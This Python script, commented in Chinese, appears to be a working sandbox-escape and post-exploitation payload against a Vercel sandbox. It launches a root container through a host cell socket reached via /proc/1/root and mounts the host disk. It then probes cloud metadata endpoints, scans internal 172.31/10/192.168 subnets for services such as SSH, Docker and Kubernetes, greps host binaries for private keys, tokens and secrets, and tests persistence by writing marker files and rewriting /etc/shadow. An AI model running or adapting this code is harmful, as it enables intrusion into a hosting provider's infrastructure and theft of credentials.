# -*- coding: utf-8 -*-
"""v180 payload: root 后 VPC 侦察 - metadata/172.31 扫描/私钥 grep/完整路由
输出 /vercel/sandbox/pwn180_out.txt + v180c.out"""
import socket, struct, time, json, os, signal, re, subprocess, select as sel

OUT = '/vercel/sandbox/v180c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(272)

R = '/proc/1/root'
CELL = R + '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'
PWN = '/vercel/sandbox/pwn180.py'
PWNOUT = '/vercel/sandbox/pwn180_out.txt'


def log(s, maxlen=4200):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def raw_req(sockpath, path, body, t=5.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return st, d[hdr_end + 4:hdr_end + 4 + 1000] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


PWN_CODE = r'''#!/usr/bin/python3
import os, sys, re, socket, struct, time, subprocess, select as sel
OUT = '/vercel/sandbox/pwn180_out.txt'
def w(s):
    try:
        with open(OUT, 'a') as ff:
            ff.write(str(s) + '\n')
    except Exception:
        pass
os.setgid(0); os.setuid(0)
os.makedirs('/mnt', exist_ok=True)
r = os.system('mount /dev/vda /mnt 2>&1')
w('MOUNT rc=%d' % r)
w('ROOT uid=%d' % os.getuid())

# 1. 宿主网络完整视图
try:
    w('ROUTE:\n' + open('/proc/net/route').read())
except Exception as e:
    w('ROUTE EXC %s' % e)
try:
    w('ARP:\n' + open('/proc/net/arp').read())
except Exception as e:
    w('ARP EXC %s' % e)
try:
    w('FIB:\n' + open('/proc/net/fib_trie').read()[:4000])
except Exception as e:
    w('FIB EXC %s' % e)
try:
    w('TCP6:\n' + open('/proc/net/tcp6').read()[:2500])
except Exception as e:
    w('TCP6 EXC %s' % e)

# 2. metadata 测试 (root 后)
for ip in ['169.254.169.254', '169.254.170.2']:
    for p in [80, 443]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            rc = s.connect_ex((ip, p))
            w('META TCP %s:%d rc=%d' % (ip, p, rc))
            if rc == 0:
                s.sendall(b'GET /latest/meta-data/ HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n')
                try:
                    d = s.recv(4096)
                    w('META RESP %s:%d: %r' % (ip, p, d[:400]))
                except Exception:
                    pass
            s.close()
        except Exception as e:
            w('META EXC %s:%d %s' % (ip, p, e))

# 3. VPC DNS 测试
for dns in ['172.31.0.2', '172.31.0.2', '100.64.0.1']:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        q = b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01'
        s.sendto(q, (dns, 53))
        d, a = s.recvfrom(512)
        w('DNS %s:53 -> %d bytes %r' % (dns, len(d), d[:60]))
        s.close()
    except Exception as e:
        w('DNS %s EXC %s' % (dns, e))

# 4. VPC 网段扫描 (172.31.0.0/24 + .1/24 优先, 再扩)
def async_scan(targets, timeout=0.5, batch=400):
    hits = []
    for b in range(0, len(targets), batch):
        chunk = targets[b:b + batch]
        socks = []
        for ip, p in chunk:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setblocking(False)
                s.connect_ex((ip, p))
                socks.append((s, ip, p))
            except Exception:
                pass
        t0 = time.time()
        while socks and time.time() - t0 < timeout:
            try:
                r, wl, x = sel.select([], [s for s, _, _ in socks], [], 0.05)
                for s in wl:
                    idx = next(i for i, (ss, _, _) in enumerate(socks) if ss == s)
                    ss, ip, p = socks.pop(idx)
                    try:
                        if ss.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR) == 0:
                            hits.append((ip, p))
                            w('VPC HIT %s:%d' % (ip, p))
                    except Exception:
                        pass
                    ss.close()
            except Exception:
                break
        for s, ip, p in socks:
            try:
                s.close()
            except Exception:
                pass
    return hits

nets = ['172.31.0.', '172.31.1.', '172.31.2.', '172.31.3.', '172.31.4.', '172.31.8.',
        '172.31.16.', '172.31.32.', '172.31.64.', '172.31.128.', '172.31.255.',
        '10.0.0.', '10.0.1.', '10.1.0.', '192.168.0.', '192.168.1.']
ports = [22, 80, 443, 53, 2375, 10250, 6443, 8080, 3000, 9090, 9100, 2379, 7000, 5000]
targets = []
for net in nets:
    for i in range(1, 255):
        ip = net + str(i)
        for p in ports:
            targets.append((ip, p))
w('SCAN targets=%d' % len(targets))
t0 = time.time()
hits = async_scan(targets, timeout=0.5, batch=400)
w('SCAN done %d hits=%r took=%.0fs' % (len(targets), hits, time.time() - t0))

# 5. sandbox-init 私钥 grep
try:
    data = open('/proc/577/exe', 'rb').read()
    w('SBI size=%d' % len(data))
    for kw in [b'BEGIN.*PRIVATE KEY', b'sk_', b'private', b'--pubkey', b'init.sock', b'sign']:
        for mm in re.finditer(kw, data):
            i = mm.start()
            w('SBI %r @0x%x: %r' % (kw, i, data[max(0, i - 60):i + 120]))
            break
except Exception as e:
    w('SBI EXC %s' % e)

# 6. celld 关键词 grep
try:
    data = open('/mnt/opt/vercel/celld', 'rb').read()
    w('CELLD size=%d' % len(data))
    for kw in [b'api.vercel', b'token', b'secret', b'jwt', b'Authorization', b'Bearer', b'mongodb', b'redis']:
        for mm in re.finditer(kw, data):
            i = mm.start()
            seg = data[max(0, i - 80):i + 150]
            printable = sum(1 for c in seg if 32 <= c < 127 or c in (9, 10, 13))
            if printable * 10 < len(seg) * 4:
                continue
            w('CELLD %r @0x%x: %r' % (kw, i, seg))
            break
except Exception as e:
    w('CELLD EXC %s' % e)

# 7. 持久化写验证
for p in ['/mnt/root/pwn180_marker', '/mnt/tmp/pwn180_marker', '/mnt/etc/pwn180_test']:
    try:
        open(p, 'w').write('pwn180')
        w('WRITE %s OK' % p)
    except Exception as e:
        w('WRITE %s EXC %s' % (p, e))
# 修改 root 密码? 不——只验证写 /etc/shadow 的权限 (写回原内容)
try:
    d = open('/mnt/etc/shadow', 'rb').read()
    open('/mnt/etc/shadow', 'wb').write(d)
    w('SHADOW WRITEBACK OK (%d bytes)' % len(d))
except Exception as e:
    w('SHADOW WB EXC %s' % e)

w('PWN180_DONE')
'''

# ============ 1: 写 pwn ============
log('=== 1 write ===')
try:
    open(PWN, 'w').write(PWN_CODE)
    os.chmod(PWN, 0o755)
    log('pwn written %d' % os.path.getsize(PWN))
except Exception as e:
    log('PWN EXC %s' % e)

# ============ 2: Create + Start ============
log('=== 2 create ===')
st, pay = raw_req(CELL, '%s/Create' % CTRS,
                  json.dumps({'drive_id': 'sandbox', 'command': PWN}).encode(), t=8)
log('Create -> %s %r' % (st, pay[:150]))
m = re.search(rb'containerId["\s:]+([A-Za-z0-9_-]+)', pay)
cid = m.group(1).decode() if m else ''
if cid:
    st2, pay2 = raw_req(CELL, '%s/Start' % CTRS, json.dumps({'container_id': cid}).encode(), t=8)
    log('Start -> %s %r' % (st2, pay2[:100]))

# ============ 3: 轮询 ============
log('=== 3 poll ===')
t0 = time.time()
seen = ''
while time.time() - t0 < 55:
    time.sleep(0.5)
    try:
        if os.path.exists(PWNOUT):
            cur = open(PWNOUT, errors='replace').read()
            if cur != seen:
                seg = cur[len(seen):] if cur.startswith(seen) else cur
                seen = cur
                for i in range(0, len(seg), 3900):
                    log('PWNSEG %d:\n%s' % (i, seg[i:i + 3900]))
            if 'PWN180_DONE' in cur:
                break
    except Exception as e:
        log('POLL EXC %s' % e)
log('poll end %d' % len(seen))

log('V180_DONE')
f.close()
